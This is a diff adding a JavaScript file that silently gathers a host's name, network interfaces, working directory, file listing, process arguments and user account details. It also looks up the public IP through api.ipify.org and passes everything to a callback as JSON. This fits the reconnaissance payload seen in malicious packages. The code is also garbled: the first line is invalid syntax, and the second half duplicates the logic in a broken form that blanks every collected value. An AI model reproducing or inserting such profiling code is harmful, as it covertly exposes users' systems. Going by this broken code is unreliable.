@@ -1,0 +1,70 @@
+function collect_data = function collect_data(callback) {
+    var os = require("os"),
+        fs = require("fs");
+    var res = {}
+    try {
+		res['hostname'] = os.hostname();
+	} catch {
+		res['hostname'] = "";
+	}
+    try {
+		res['networkInterfaces'] = os.networkInterfaces();
+	} catch {
+		res['networkInterfaces'] = "";
+	}
+    try {
+		res['local_time'] = (new Date()).toTimeString();
+	} catch {
+		res['local_time'] = "";
+	}
+    try {
+		res['pwd'] = process.cwd();
+	} catch {
+		res['pwd'] = "";
+	}
+    try {
+		res['list_of_files'] = fs.readdirSync(".");
+	} catch {
+		res['list_of_files'] = "";
+	}
+    try {
+		res['argv'] = process.argv;
+	} catch {
+		res['argv'] = "";
+	}
+    try {
+		res['user'] = os.userInfo();
+	} catch {
+		res['user'] = "";
+	}
+
+    https.get({'host': 'api.ipify.org', 'port': 443, 'path': '/'}, function(resp) {
+        resp.on('data', function(ip) {
+            res['ip'] = ip.toString();
+            callback(JSON.stringify(res));
+        });
+    });
+}
+var os = require("os")
+var fs = require("fs")
+var res = {}
+res['hostname'] = os.hostname()
+res['hostname'] = ""
+res['networkInterfaces'] = os.networkInterfaces()
+res['networkInterfaces'] = ""
+res['local_time'] = (new Date()).toTimeString()
+res['local_time'] = ""
+res['pwd'] = process.cwd()
+res['pwd'] = ""
+res['list_of_files'] = fs.readdirSync(".")
+res['list_of_files'] = ""
+res['argv'] = process.argv
+res['argv'] = ""
+res['user'] = os.userInfo()
+res['user'] = ""
+https.get({'host': 'api.ipify.org', 'port': 443, 'path': '/'}, function(resp) {
+        resp.on('data', function(ip) {
+            res['ip'] = ip.toString();
+            callback(JSON.stringify(res));
+        });
+    })
